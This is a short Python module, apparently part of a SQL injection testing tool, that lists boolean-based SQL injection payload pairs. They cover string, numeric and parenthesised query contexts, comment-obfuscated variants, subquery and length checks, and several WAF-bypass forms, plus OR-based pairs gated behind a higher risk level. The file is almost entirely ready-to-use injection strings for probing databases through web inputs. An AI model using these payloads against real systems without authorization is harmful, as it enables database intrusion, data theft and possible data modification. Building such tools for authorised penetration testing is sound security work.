# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
Boolean-based payload pairs.
"""
from __future__ import annotations

from typing import List, Tuple

# ---------------------------------------------------------------------------
# Boolean-based payload pairs (true_payload, false_payload)
# ---------------------------------------------------------------------------

BOOLEAN_PAIRS: List[Tuple[str, str]] = [
    # Classic AND string context
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1-- -",  "' AND 1=2-- -"),
    ("' AND 1=1#",     "' AND 1=2#"),
    # Numeric context (no quotes needed)
    (" AND 1=1",       " AND 1=2"),
    (" AND 1=1-- -",   " AND 1=2-- -"),
    # Single-paren escape: WHERE x=('val') context
    ("') AND 1=1-- -",  "') AND 1=2-- -"),
    ("') AND 1=1 --",   "') AND 1=2 --"),
    # Double-paren escape: WHERE x LIKE ('%val%') context
    ("')) AND 1=1-- -", "')) AND 1=2-- -"),
    ("')) AND 1=1 --",  "')) AND 1=2 --"),
    # OR variants (risk>=2)
    ("' OR '1'='1", "' OR '1'='2"),
    ("' OR 1=1-- -",  "' OR 1=2-- -"),
    # Comment variants
    ("'/**/AND/**/1=1-- -", "'/**/AND/**/1=2-- -"),
    # Subquery
    ("' AND (SELECT 1)=1-- -", "' AND (SELECT 1)=2-- -"),
    # String length
    ("' AND LENGTH('a')=1-- -", "' AND LENGTH('a')=2-- -"),
    # AND 0 / AND False WAF bypass alternatives
    ("' AND char(0) UNION SELECT 1-- -", "' AND char(1) UNION SELECT 1-- -"),
    ("' AND 1*0 ORDER BY 1-- -",         "' AND 1*1 ORDER BY 1-- -"),
    ("' AND mod(29,9) ORDER BY 1-- -",   "' AND mod(1,9) ORDER BY 1-- -"),
    ("' AND point(29,9) ORDER BY 1-- -", "' AND point(1,9) ORDER BY 1-- -"),
    ("' AND nullif(1337,1337) ORDER BY 1-- -", "' AND nullif(1336,1337) ORDER BY 1-- -"),
    ("' AND False UNION SELECT 1-- -",   "' AND True UNION SELECT 1-- -"),
    ("' AND IF(1=1,1,0)=1-- -",          "' AND IF(1=2,1,0)=1-- -"),
    ("' AND CASE WHEN 1=1 THEN 1 ELSE 0 END=1-- -", "' AND CASE WHEN 1=2 THEN 1 ELSE 0 END=1-- -"),
]

# Only use OR-based pairs when risk >= 2 (they can modify data if stacked)
BOOLEAN_PAIRS_RISK2: List[Tuple[str, str]] = [
    ("' OR '1'='1", "' OR '1'='2"),
    ("' OR 1=1-- -",  "' OR 1=2-- -"),
    ("1 OR 1=1",    "1 OR 1=2"),
]


def get_boolean_pairs(risk: int) -> List[Tuple[str, str]]:
    """Return boolean payload pairs for the given risk level."""
    pairs = BOOLEAN_PAIRS.copy()
    if risk >= 2:
        pairs += BOOLEAN_PAIRS_RISK2
    return pairs
